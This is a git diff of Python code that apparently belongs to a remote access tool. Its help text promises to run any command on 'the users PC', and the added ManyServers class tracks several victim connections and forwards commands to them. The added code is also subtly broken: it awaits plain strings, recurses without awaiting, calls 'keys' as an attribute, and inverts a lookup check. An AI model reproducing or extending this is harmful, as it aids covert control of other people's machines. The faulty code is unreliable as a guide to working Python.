@@ -25,6 +25,37 @@ def helpCommand():
     result = result + "\n" + "[∞] Anything - will run a command on the users PC like command prompt\n"
     return result
 
+class ManyServers:
+    def __init__(self):
+        import config
+        self.servers = {}
+        server = Server(config.SERVER_IP, config.SERVER_PORT)
+        self.servers.update({server.tag: server})
+    
+    async def add_connection(self):
+        import config
+        server = Server(config.SERVER_IP, config.SERVER_PORT)
+        self.servers.update({server.tag: server})
+        self.add_connection()
+    
+    async def view_all_servers(self):
+        s = ""
+        for i in self.servers.keys:
+            s = s + i + "\n"
+        await s
+    
+    async def make_command_to_server(self, command):
+        tag = command.split()[0]
+        if not self.servers.get(tag, "no") == "no":
+            await f"exist not connection with name: {tag}"
+        elif self.servers[tag].in_process:
+            await f"{tag} connection already in process"
+        else:
+            # @todo all
+            command = command.split()[1]
+            res = self.servers[tag].step(command)
+            await res
+
 
 class Server:
     def __init__(self, ip, port):
